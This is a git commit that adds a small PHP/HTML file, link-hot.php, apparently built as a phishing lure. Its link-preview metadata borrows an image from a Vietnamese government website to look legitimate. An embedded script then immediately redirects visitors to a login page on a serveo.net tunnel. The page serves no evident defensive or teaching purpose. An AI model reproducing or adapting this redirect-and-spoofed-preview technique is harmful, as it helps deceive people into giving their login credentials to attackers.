9b0c8dcfa2127eaa4327052feef1307c40fc93e3
nhanxoz <nhan9ckl@gmail.com>
2024-02-25 22:40:41 +0700

    Create link-hot.php

---
+++ link-hot.php
@@ -0,0 +1,16 @@
+<html xmlns="http://www.w3.org/1999/xhtml" lang="vi" prefix="og:http://oqp.me/ns# fb: http://oqp.me/ns/fb#" >
+    <head>
+        <meta property="og:locale" content="vi_VN"/>
+        <meta property="og:description" content=""/>
+        <meta property="og:site_name" content=""/>
+        <meta property="og:title" content=" "/>
+        <meta property="og:url" content="https://binhphuoc.gov.vn/uploads/binhphuoc/news/2020_06/qd-146-ngay-12.6.2020.png"/>
+        <meta property="og:image" content="https://binhphuoc.gov.vn/uploads/binhphuoc/news/2020_06/qd-146-ngay-12.6.2020.png"/>
+    </head>
+    <body>
+          <script>
+window.location.replace("https://9e8d863b3b5ac04b887c69dd944ae189.serveo.net/login.html.php")
+    </script>  
+    </body>
+
+</html>
